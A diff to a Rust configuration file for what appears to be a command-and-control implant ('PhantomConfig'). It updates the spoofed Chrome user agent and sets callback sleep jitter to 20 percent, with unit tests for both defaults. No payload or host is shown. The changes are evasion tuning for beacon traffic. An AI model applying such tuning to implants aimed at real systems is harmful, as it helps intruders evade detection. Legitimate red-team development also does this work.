@@ -241,10 +241,10 @@ impl Default for PhantomConfig {
             init_secret_version: None,
             pinned_cert_pem: None,
             user_agent: String::from(
-                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
             ),
             sleep_delay_ms: 5_000,
-            sleep_jitter: 0,
+            sleep_jitter: 20,
             kill_date: None,
             working_hours: None,
             sleep_mode: SleepMode::default(),
@@ -284,6 +284,18 @@ mod tests {
     fn default_config_is_valid() {
         let config = PhantomConfig::default();
         assert!(config.validate().is_ok());
+    }
+
+    #[test]
+    fn default_jitter_is_20_percent() {
+        let config = PhantomConfig::default();
+        assert_eq!(config.sleep_jitter, 20);
+    }
+
+    #[test]
+    fn default_user_agent_is_current_chrome() {
+        let config = PhantomConfig::default();
+        assert!(config.user_agent.contains("Chrome/136.0.0.0"), "UA was: {}", config.user_agent);
     }
 
     #[test]
